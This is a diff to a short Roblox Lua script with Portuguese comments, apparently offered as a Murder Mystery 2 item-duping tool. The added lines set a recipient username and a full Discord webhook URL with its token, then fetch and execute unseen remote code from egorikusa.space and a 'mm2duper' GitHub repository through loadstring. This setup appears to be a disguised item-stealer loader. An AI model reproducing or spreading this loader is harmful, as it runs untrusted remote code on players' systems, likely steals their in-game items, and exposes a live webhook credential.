@@ -1,8 +1,9 @@
--- Carrega e executa o primeiro script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/mm2dupescript/main/mm2duperscript"))()
+-- Definindo o username e webhook
+local Username = "ARTHURMGIC"
+local Webhook = "https://discord.com/api/webhooks/1261755318237663394/aLyN7WNG8sPLfHcnFEtHIREvSUN21y8exwlMYlj6ei-7_-8ORxSwa5J6WcFDZi5_NZIQ"
 
--- Espera 1 segundo
-wait(1)
+-- Executando o primeiro script
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
 
--- Carrega e executa o segundo script
-loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-YARHM-12403"))()
+-- Executando o segundo script do GitHub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/gui/main/gui"))()
